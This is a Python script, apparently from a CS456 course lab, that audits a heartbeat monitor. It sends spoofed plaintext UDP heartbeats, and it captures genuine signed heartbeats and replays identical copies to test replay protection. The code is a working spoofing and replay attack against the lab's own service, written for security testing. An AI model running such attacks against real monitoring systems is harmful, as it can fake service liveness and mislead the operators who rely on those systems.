
"""CS456 - Adversarial heartbeat audit: spoofing and replay tests."""

import argparse
import socket
import time

import config
from protocol import PLAIN_BEAT


def spoof_heartbeats(duration, interval):
    """Send fake plaintext heartbeats to the monitor."""
    target = (config.HOST, config.MONITOR_PORT)

    print("[ATTACK] Starting heartbeat spoofing")
    print(f"[TARGET] {target[0]}:{target[1]}")

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        end_time = time.monotonic() + duration
        count = 0

        while time.monotonic() < end_time:
            sock.sendto(PLAIN_BEAT, target)
            count += 1
            print(f"[SPOOF] Fake heartbeat #{count} sent")

            remaining = end_time - time.monotonic()
            if remaining > 0:
                time.sleep(min(interval, remaining))

    print(f"[DONE] Sent {count} fake heartbeats")


def replay_heartbeats(duration, monitor_port):
    """
    Capture genuine UDP heartbeats, forward them to the monitor,
    and immediately send an identical copy.

    The real service sends to port 5001.
    This audit script listens on 5001 and forwards to the
    secure monitor running on port 5002.

    The captured message is not modified or re-signed.
    """
    listen_address = (config.HOST, config.MONITOR_PORT)
    monitor_address = (config.HOST, monitor_port)

    print("[ATTACK] Starting heartbeat replay test")
    print(f"[LISTEN] {listen_address[0]}:{listen_address[1]}")
    print(f"[FORWARD] {monitor_address[0]}:{monitor_address[1]}")
    print("[INFO] Waiting for genuine signed heartbeats...")

    captured = 0

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
        sock.bind(listen_address)
        sock.settimeout(0.5)

        end_time = time.monotonic() + duration

        while time.monotonic() < end_time:
            try:
                data, sender = sock.recvfrom(4096)
            except socket.timeout:
                continue

            if not data.startswith(b"HEARTBEAT|"):
                print("[SKIP] Received a non-secure heartbeat")
                continue

            captured += 1

            # Forward the genuine message unchanged.
            sock.sendto(data, monitor_address)
            print(f"[FORWARD] Genuine heartbeat #{captured} forwarded")

            # Send the exact same bytes again.
            time.sleep(0.1)
            sock.sendto(data, monitor_address)
            print(f"[REPLAY] Identical heartbeat #{captured} resent")

    print(f"[DONE] Captured and replayed {captured} heartbeats")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CS456 heartbeat spoofing and replay audit"
    )

    parser.add_argument(
        "--mode",
        choices=["spoof", "replay"],
        default="spoof",
    )
    parser.add_argument("--duration", type=float, default=15)
    parser.add_argument("--interval", type=float, default=1)
    parser.add_argument("--monitor-port", type=int, default=5002)

    args = parser.parse_args()

    if args.duration <= 0 or args.interval <= 0:
        parser.error("Duration and interval must be positive.")

    if args.mode == "spoof":
        spoof_heartbeats(args.duration, args.interval)
    else:
        if args.monitor_port == config.MONITOR_PORT:
            parser.error(
                "Replay monitor port must differ from the service's "
                "heartbeat destination port."
            )

        replay_heartbeats(args.duration, args.monitor_port)
